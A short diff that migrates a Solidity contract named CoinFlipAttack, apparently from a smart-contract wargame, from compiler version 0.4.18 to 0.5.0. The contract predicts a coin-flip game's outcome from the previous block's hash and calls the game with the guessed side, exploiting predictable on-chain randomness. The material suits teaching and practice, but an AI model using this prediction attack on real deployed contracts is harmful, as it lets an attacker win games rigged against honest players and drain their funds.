@@ -1,4 +1,4 @@
-pragma solidity ^0.4.18;
+pragma solidity ^0.5.0;
 
 import '../levels/CoinFlip.sol';
 import 'openzeppelin-solidity/contracts/math/SafeMath.sol';
@@ -10,7 +10,7 @@ contract CoinFlipAttack {
 
   function attack(address _victim) public returns (bool) {
     CoinFlip coinflip = CoinFlip(_victim);
-    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));
+    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
     uint256 coinFlip = uint256(uint256(blockValue).div(FACTOR));
     bool side = coinFlip == 1 ? true : false;
     coinflip.flip(side);
